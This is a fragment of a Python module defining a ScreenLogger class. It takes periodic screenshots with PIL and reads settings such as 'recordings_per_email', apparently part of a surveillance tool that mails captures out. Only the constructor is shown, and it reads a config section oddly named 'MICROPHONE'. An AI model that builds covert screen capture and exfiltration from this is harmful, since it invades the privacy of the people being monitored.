from PIL.ImageGrab import grab
from os.path import join
from datetime import datetime
from time import sleep
import threading

from config.config_loader import get_section_config
from core.utils.logging_utils import log_data, log_error

class ScreenLogger:
    def __init__(self) -> None:
        self.config = get_section_config("MICROPHONE")
        self.logs_directory_path = self.config["logs_directory_path"]
        self.error_file_path = join(self.config["logs_directory_path"], "errors.txt")
        self.counter = 0
        self.counter_max = int(self.config["recordings_per_email"])  # Convert to int
        self.interval = int(self.config["interval"])  # Convert to int
        self.stop_event = threading.Event()
        self.thread = None